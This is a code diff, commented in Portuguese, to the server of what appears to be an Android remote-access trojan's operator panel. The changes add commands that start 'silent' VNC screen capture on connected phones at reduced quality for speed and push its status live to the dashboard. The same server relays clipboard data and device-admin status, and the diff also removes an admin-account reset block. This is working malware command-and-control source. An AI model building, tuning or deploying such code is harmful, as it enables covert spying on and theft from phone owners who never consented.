@@ -251,51 +251,6 @@ try:
 except Exception as e:
     print(f"⚠️ Erro ao tentar migrar banco de dados: {e}")
 
-# ── RESET / CREATE ADMIN via ENV VAR ────────────────────────────────────────
-# Render: set RESET_ADMIN_PASSWORD=yourpassword in Environment tab.
-# After logging in, remove the env var and redeploy.
-_reset_pw = os.getenv("RESET_ADMIN_PASSWORD", "").strip()
-if _reset_pw:
-    try:
-        import bcrypt as _bcrypt
-        from database import SessionLocal as _SL
-        from models import Operator as _Op
-        _db = _SL()
-        try:
-            _admin = _db.query(_Op).filter(_Op.username == "admin").first()
-            _hashed = _bcrypt.hashpw(_reset_pw.encode("utf-8"), _bcrypt.gensalt()).decode("utf-8")
-            if _admin:
-                _admin.hashed_password  = _hashed
-                _admin.totp_enabled     = False
-                _admin.totp_secret      = None
-                _admin.totp_temp_secret = None
-                _admin.is_active        = True
-                _admin.is_banned        = False
-                _admin.is_admin         = True
-                _db.commit()
-                print("[RESET] ✅ Admin password updated successfully.")
-            else:
-                # Admin doesn't exist yet (fresh PostgreSQL DB) — create it
-                _new_admin = _Op(
-                    username        = "admin",
-                    email           = "admin@gangstar.local",
-                    hashed_password = _hashed,
-                    is_admin        = True,
-                    is_active       = True,
-                    is_banned       = False,
-                    totp_enabled    = False,
-                    totp_secret     = None,
-                    hwid            = None,
-                )
-                _db.add(_new_admin)
-                _db.commit()
-                print("[RESET] ✅ Admin user created successfully.")
-        finally:
-            _db.close()
-    except Exception as _reset_err:
-        print(f"[RESET] ❌ Failed: {_reset_err}")
-# ────────────────────────────────────────────────────────────────────────────
-
 async def periodic_wal_checkpoint():
     """Executa checkpoint do WAL e descarta conexões ociosas a cada 2 min para manter WAL compacto"""
     counter = 0
@@ -496,7 +451,7 @@ HIERARCHY_CACHE_DIR.mkdir(parents=True, exist_ok=True)
 # TTLs otimizados
 FRAME_TTL = timedelta(seconds=int(os.getenv("FRAME_TTL_SECONDS", "30")))
 HIERARCHY_TTL = timedelta(seconds=int(os.getenv("HIERARCHY_TTL_SECONDS", "20")))
-DASHBOARD_QUEUE_SIZE = int(os.getenv("DASHBOARD_QUEUE_SIZE", "5"))  # Fila maior = menos drops, menos travamentos
+DASHBOARD_QUEUE_SIZE = int(os.getenv("DASHBOARD_QUEUE_SIZE", "2"))  # Smaller queue = lower latency (APK drains anyway)
 
 # Cache simples para reduzir consultas ao banco - OTIMIZADO
 from functools import lru_cache
@@ -1271,9 +1226,18 @@ class DeviceConnectionManager:
         if latest:
             await queue.put(latest)
 
-        # Força o dispositivo Android a iniciar/solicitar um novo frame VNC ao vivo imediatamente
+        # Força o dispositivo Android a iniciar captura VNC com qualidade otimizada para velocidade
         asyncio.create_task(self.send_command(device_id, {"action": "START_SILENT_VNC"}))
+        asyncio.create_task(self.send_command(device_id, {"action": "SET_SILENT_VNC_QUALITY", "quality": 25}))
         asyncio.create_task(self.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))
+        # Envia status atual do VNC para o novo subscriber imediatamente
+        silent_state = self.device_silent_state.get(device_id, {})
+        if silent_state:
+            asyncio.create_task(websocket.send_json({
+                "type": "SILENT_VNC_STATUS",
+                "active": silent_state.get("active", False),
+                "method": silent_state.get("method", "silent")
+            }))
         return queue
     
     def unregister_dashboard_client(self, device_id: str, websocket: WebSocket):
@@ -1318,6 +1282,15 @@ class DeviceConnectionManager:
             if not self.dashboard_subscribers[device_id]:
                 self.dashboard_subscribers.pop(device_id, None)
     
+    async def _broadcast_status_to_dashboard(self, device_id: str, payload: dict):
+        """Envia mensagem JSON de status para todos os subscribers do dashboard de um dispositivo."""
+        subscribers = self.dashboard_subscribers.get(device_id, [])
+        for sub in subscribers:
+            try:
+                await sub.websocket.send_json(payload)
+            except Exception:
+                pass
+
     def _frame_cache_path(self, device_id: str) -> Path:
         return FRAME_CACHE_DIR / f"{device_id}.jpg"
     
@@ -1674,6 +1647,7 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
 
     # Dispara aquecimento de captura VNC imediatamente ao conectar o aparelho
     asyncio.create_task(manager.send_command(device_id, {"action": "START_SILENT_VNC"}))
+    asyncio.create_task(manager.send_command(device_id, {"action": "SET_SILENT_VNC_QUALITY", "quality": 25}))
     asyncio.create_task(manager.send_command(device_id, {"action": "REQUEST_VNC_FRAME"}))
 
     
@@ -1793,10 +1767,18 @@ async def websocket_endpoint(websocket: WebSocket, device_id: str = None, build_
                                 except Exception:
                                     pass
                         elif msg_type == "SILENT_VNC_STATUS":
+                            _vnc_active = bool(message.get("active", False))
+                            _vnc_method = message.get("method", "silent")
                             manager.device_silent_state[device_id] = {
-                                "active": bool(message.get("active", False)),
-                                "method": message.get("method", "silent")
+                                "active": _vnc_active,
+                                "method": _vnc_method
                             }
+                            # Push status em tempo real para o painel
+                            asyncio.create_task(manager._broadcast_status_to_dashboard(device_id, {
+                                "type": "SILENT_VNC_STATUS",
+                                "active": _vnc_active,
+                                "method": _vnc_method
+                            }))
                         elif msg_type == "ADMIN_STATUS":
                             admin_state = message.get("data") == "ACTIVE"
                             if device_id not in manager.device_info:
@@ -2005,11 +1987,19 @@ async def handle_device_message(device_id: str, message: dict, db: Session):
 
     elif msg_type == "SILENT_VNC_STATUS":
         # Status do caminho silencioso dedicado (BTMOB purple button)
+        _vnc_active_bg = bool(message.get("active", False))
+        _vnc_method_bg = message.get("method", "silent")
         manager.device_silent_state[device_id] = {
-            "active": bool(message.get("active", False)),
-            "method": message.get("method", "silent")
+            "active": _vnc_active_bg,
+            "method": _vnc_method_bg
         }
-        logger.info(f"🔇 SILENT_VNC_STATUS de {device_id}: active={message.get('active')}, method={message.get('method')}")
+        # Push status em tempo real para o painel
+        asyncio.create_task(manager._broadcast_status_to_dashboard(device_id, {
+            "type": "SILENT_VNC_STATUS",
+            "active": _vnc_active_bg,
+            "method": _vnc_method_bg
+        }))
+        logger.info(f"🔇 SILENT_VNC_STATUS de {device_id}: active={_vnc_active_bg}, method={_vnc_method_bg}")
         
     elif msg_type in ("CLIPBOARD", "CLIPBOARD_DATA"):
         clip_text = message.get("text") or message.get("data") or ""
@@ -7357,20 +7347,21 @@ async def dashboard_stream(websocket: WebSocket, device_id: str):
         _send_errors = 0
         while True:
             try:
-                frame = await asyncio.wait_for(queue.get(), timeout=15.0)
-                
-                # Drena frames extras acumulados - entrega só o mais recente
+                frame = await asyncio.wait_for(queue.get(), timeout=5.0)
+
+                # Drena frames extras acumulados - entrega só o mais recente (menor latência)
                 latest = frame
                 while not queue.empty():
                     try:
                         latest = queue.get_nowait()
                     except asyncio.QueueEmpty:
                         break
-                
+
                 await websocket.send_bytes(latest)
                 _send_errors = 0
             except asyncio.TimeoutError:
                 try:
+                    # Keepalive: empty frame ping
                     await websocket.send_bytes(b'')
                 except Exception:
                     break
